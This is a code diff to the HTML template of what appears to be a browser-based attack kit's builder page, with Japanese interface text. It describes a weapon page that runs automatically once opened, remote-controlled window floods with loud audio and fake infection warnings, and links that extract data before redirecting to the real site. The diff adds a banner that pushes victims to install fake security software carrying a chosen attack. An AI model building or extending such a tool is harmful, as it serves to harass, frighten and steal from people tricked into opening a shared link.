@@ -29,6 +29,8 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
 .badge{display:inline-block;font-size:11px;padding:2px 8px;border-radius:999px;
   background:#20242e;border:1px solid #39415a;color:#c7cddb}
 .badge.on{background:#16321f;border-color:#2e6b45;color:#7ee08a}
+.chk{display:flex;gap:6px;align-items:center;font-size:12px;color:#c7cddb;margin-top:8px}
+.chk input{width:auto;margin:0}
 </style></head><body>
 
 <div class="tabs">
@@ -45,8 +47,9 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
 <div class="caution big">
   ⚠ <b>掟</b><br>
   ・開いた瞬間から全部自動・無限。<b>ボタン操作は不要</b>。画面はスピナーだけ。<br>
-  ・窓爆弾は1セット＝10 / 100 / ∞ を選べる（既定100）。<b>10秒以内に出し切る</b>。<br>
-  ・発射／停止／枚数は <b>こちらの監視室から遠隔操作</b>（兵器ページがポーリング）。<br>
+  ・爆音窓爆弾は1セット＝10 / 100 / ∞（既定100）。<b>10秒以内に出し切る</b>。全ウィンドウが爆音ループ＋感染表示。<br>
+  ・発射／停止／枚数は <b>こちらの監視室から遠隔操作</b>。<br>
+  ・通知バナーで「偽の対策ソフト」を入れさせられる。入れる先の兵器は作成時に指定。<br>
   ・リンク型は抜き取ったあと本物へ飛ぶ（自爆）。常駐型はホーム画面に追加＝自爆。<br>
   ・<b>インストール不要</b>。URLをコピー／共有でそのまま渡せる。
 </div>
@@ -60,13 +63,23 @@ input.url{flex:1;min-width:190px;font-family:ui-monospace,Menlo,monospace;font-s
       <option value="{{ m }}" {% if m == 'mix' %}selected{% endif %}>{{ label }}</option>
       {% endfor %}
     </select></label>
-  <label>1セットの枚数（窓爆弾・ミックス）
+  <label>1セットの枚数（爆音窓爆弾・ミックス）
     <select name="winset">
       <option value="10">10枚</option>
       <option value="100" selected>100枚</option>
       <option value="0">∞（止まるまで）</option>
     </select></label>
   <label>飛び先（リンク型 / 全部ミックスのとき） <input type="text" name="dest" placeholder="https://..."></label>
+  <label>通知文（上から出るバナー）
+    <input type="text" name="notify_text" value="{{ default_notify }}"></label>
+  <label>その通知でインストールさせる兵器
+    <select name="notify_mode">
+      <option value="">なし（自動）</option>
+      {% for m, label, desc in modes %}
+      <option value="{{ m }}">{{ label }}</option>
+      {% endfor %}
+    </select></label>
+  <label class="chk"><input type="checkbox" name="notify" value="1" checked> 通知バナーを出す</label>
   <label>メモ <input type="text" name="note"></label>
   <button type="submit">作成してリンクを取得</button>
 </form>
